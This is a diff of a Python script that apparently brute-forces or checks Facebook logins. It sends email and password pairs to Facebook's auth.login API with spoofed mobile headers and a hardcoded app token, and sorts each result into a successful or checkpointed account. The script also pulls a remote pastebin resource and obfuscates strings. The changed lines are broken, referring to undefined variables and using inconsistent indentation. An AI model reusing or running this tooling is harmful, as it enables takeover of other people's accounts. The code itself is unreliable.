@@ -58,7 +58,7 @@ base4 = (basex3).upper()
 basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
 
 try:
-    rq = requests.get('https://pastebin.com/raw/JK4VsVnh').text
+    rq = requests.get('https://pastebin.com/raw/j9AKAgEy').text
 except requests.exceptions.ConnectionError:
     print('\nNO INTERNET CONNECTION\n')
     exit()
@@ -976,26 +976,9 @@ def log_api_2(em,pas):
 def log_mbasic_1(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
     r = requests.Session()
-    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-        "x-fb-sim-hni": str(random.randint(20000, 40000)),
-        "x-fb-net-hni": str(random.randint(20000, 40000)),
-        "x-fb-connection-quality": "EXCELLENT",
-        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-        "user-agent": ua,
-        "content-type": "application/x-www-form-urlencoded",
-        "x-fb-http-engine": "Liger"}
-    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
-        'format': 'json', 
-        'sdk_version': '2', 
-        'email': em, 
-        'locale': 'ar_AR', 
-        'password': pas, 
-        'sdk': 'ios', 
-        'generate_session_cookies': '1', 
-        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
-    api = 'https://b-api.facebook.com/method/auth.login'
-    response = r.get(api, params=param, headers=header)
-    if 'session_key' in response.text and 'EAAA' in response.text:
+    headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
+		if "session_key" in send.text and "EAAA" in send.text:
         return {"status":"success","email":em,"pass":pas}
     elif 'www.facebook.com' in response.json()['error_msg']:
         return {"status":"cp","email":em,"pass":pas}
